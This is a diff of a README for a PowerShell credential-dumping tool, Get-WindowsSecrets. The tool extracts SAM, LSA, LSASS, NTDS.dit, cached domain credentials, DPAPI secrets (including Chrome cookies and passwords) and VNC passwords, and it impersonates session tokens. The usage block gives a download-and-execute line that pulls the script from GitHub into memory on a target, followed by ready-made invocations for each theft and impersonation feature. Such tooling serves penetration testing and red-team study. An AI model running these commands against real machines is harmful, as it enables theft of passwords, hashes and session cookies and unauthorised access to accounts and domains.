@@ -10,7 +10,7 @@ The script work (or should work!) on a local Windows machine:
   * Powershell v2 to latest
   * Windows NT 6.0 to latest
 
-It is not intended to bypass AVs and you have to be administrator on the computer.<br/>
+It is not intended to bypass AVs/EDRs and you have to be administrator on the computer.<br/>
 The code is commented to understand each process.
 
 Currently It can:<br/>
@@ -28,7 +28,7 @@ Currently It can:<br/>
    * Dump Cached Domain Credentials
    * Dump DPAPI Secrets<br/>
       * Wi-Fi passwords<br/>
-      * <del>Chrome cookies/passwords</del> (Removed because It required loading ChilkatDotNet2 and System.Data.SQLite DLLs). Writed into [Get-ChromeSecrets](<https://github.com/YRazafim/Get-WindowsSecrets/blob/main/Get-ChromeSecrets.ps1>). Dlls are hardcoded into the file<br/>
+      * Chrome cookies/passwords<br/>
       * Vault Credential Manager passwords (VPOL and VCRD files)
    * Dump VNC passwords (RealVNC, TightVNC, TigerVNC, UltraVNC)
    * Dump NTDS.dit (Shadow Copy and parsing as ESE format)
@@ -41,15 +41,21 @@ Download the script on target and from Powershell:
 ```
 IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/YRazafim/Get-WindowsSecrets/main/Get-WindowsSecrets.ps1")
 . <Path>\Get-WindowsSecrets.ps1;
-Get-WindowsSecrets -Creds <User1>:<Pwd1>/<User2>:<Pwd2>
-Get-WindowsSecrets -NTHashes <User>:<NTHash>
-Get-WindowsSecrets -Creds <User>:<Pwd> -NTHashes <User1>:<NTHash1>/<User2>:<NTHash2>
-Get-WindowsSecrets -SkipDPAPI $True
-Get-WindowsSecrets
-ListSessionTokens
-Get-WindowsSecrets -ImpersonateTokenProcID <ProcID> -ImpersonateMethod ImpersonateLoggedOnUser
-Get-WindowsSecrets -ImpersonateTokenProcID <ProcID> -ImpersonateMethod CreateProcessWithToken
-Get-WindowsSecrets -ImpersonateTokenProcID <ProcID> -ImpersonateMethod CreateProcessAsUser -ImpersonateIsSystem "True"/"False" -ImpersonateConnectTokenPipe "True"/"False" -ImpersonateCommand "Null"/"<CmdToExecute>"
+Get-WindowsSecrets -SAM
+Get-WindowsSecrets -LSA
+Get-WindowsSecrets -CachedDomainCreds
+Get-WindowsSecrets -VNC
+Get-WindowsSecrets -NTDS
+Get-WindowsSecrets -SessionTokens
+Get-WindowsSecrets -ActivatePrivilege "SeShutdownPrivilege"
+Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "ImpersonateLoggedOnUser"
+Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "CreateProcessWithToken"
+Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "CreateProcessAsUser"
+Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "CreateProcessAsUser" -Command "whoami"
+Get-WindowsSecrets -LSASS
+Get-WindowsSecrets -DPAPI
+Get-WindowsSecrets -DPAPI -Creds 'User1:Pwd1/User2@Domain:Pwd2' -NTHashes 'User1:HexNTHash1/User2@Domain:HexNTHash2'
+Get-WindowsSecrets -DPAPI -Creds 'User1:Pwd1/User2@Domain:Pwd2' -NTHashes 'User1:HexNTHash1/User2@Domain:HexNTHash2' -SkipLSASS
 ```
 
 Creds and NTHashes parameters helped for DPAPI only (If you compromised these secrets for a user).
